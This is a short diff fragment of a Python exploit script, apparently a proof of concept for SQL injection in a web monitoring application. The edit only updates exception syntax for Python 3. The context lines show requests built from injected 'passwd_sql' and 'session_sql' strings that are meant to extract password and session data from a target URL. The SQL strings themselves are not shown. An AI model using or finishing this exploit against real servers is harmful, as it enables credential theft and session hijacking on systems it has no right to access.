@@ -36,7 +36,7 @@ def poc(url):
                 passwd_sql) + "&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
             try:
                 response = urllib2.urlopen(payload_inject, timeout=10).read()
-            except Exception, msg:
+            except Exception as msg:
                 # print( msg)
                 pass
             else:
@@ -48,7 +48,7 @@ def poc(url):
                 session_sql) + "&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
             try:
                 response = urllib2.urlopen(payload_inject, timeout=10).read()
-            except Exception, msg:
+            except Exception as msg:
                 # print( msg)
                 pass
             else:
